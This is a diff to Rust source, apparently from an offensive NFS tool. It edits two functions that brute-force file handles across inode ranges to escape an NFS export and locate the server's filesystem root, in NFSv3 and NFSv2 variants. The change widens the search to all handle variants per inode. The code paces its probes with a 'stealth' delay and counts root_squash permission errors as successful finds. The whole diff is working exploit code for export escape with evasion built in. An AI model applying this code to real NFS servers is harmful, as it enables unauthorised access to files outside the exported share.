@@ -876,21 +1042,23 @@ async fn find_escape_matrix(host: &str, export: &str, btrfs_subvols: u32, max_ro
 
         // Phase 2: inode scan with this seed
         for inode in 2..=max_root_scan {
-            let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else { continue };
-            stealth.wait().await;
-            match nfs3.attrs(&candidate.root_handle).await {
-                Ok(a) if a.file_type == FileType::Directory => {
-                    let self_id = a.fileid;
-                    if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&nfs3, &candidate.root_handle, self_id).await {
-                        let note = format!("found via scan (matrix: seed={})", seed_th.variant.label);
+            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(seed, inode, 0);
+            for candidate in candidates {
+                stealth.wait().await;
+                match nfs3.attrs(&candidate.root_handle).await {
+                    Ok(a) if a.file_type == FileType::Directory => {
+                        let self_id = a.fileid;
+                        if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&nfs3, &candidate.root_handle, self_id).await {
+                            let note = format!("found via scan (matrix: seed={})", seed_th.variant.label);
+                            return Some((nfs3, EscapeOutcome::Success { candidate, note }));
+                        }
+                    },
+                    Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &candidate).await => {
+                        let note = format!("found via scan (matrix: seed={}, root_squash active)", seed_th.variant.label);
                         return Some((nfs3, EscapeOutcome::Success { candidate, note }));
-                    }
-                },
-                Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &candidate).await => {
-                    let note = format!("found via scan (matrix: seed={}, root_squash active)", seed_th.variant.label);
-                    return Some((nfs3, EscapeOutcome::Success { candidate, note }));
-                },
-                _ => {},
+                    },
+                    _ => {},
+                }
             }
         }
     }
@@ -946,16 +1114,18 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
 
     // Phase 2: inode scan
     for inode in 2..=max_root_scan {
-        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode, 0) else { continue };
-        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
-        match client.getattr(&fh).await {
-            Ok(a) if a.ftype == FType::Directory => {
-                return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
-            },
-            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
-                found_stale = true;
-            },
-            _ => {},
+        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&seed, inode, 0);
+        for candidate in candidates {
+            let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
+            match client.getattr(&fh).await {
+                Ok(a) if a.ftype == FType::Directory => {
+                    return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
+                },
+                Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
+                    found_stale = true;
+                },
+                _ => {},
+            }
         }
     }
 
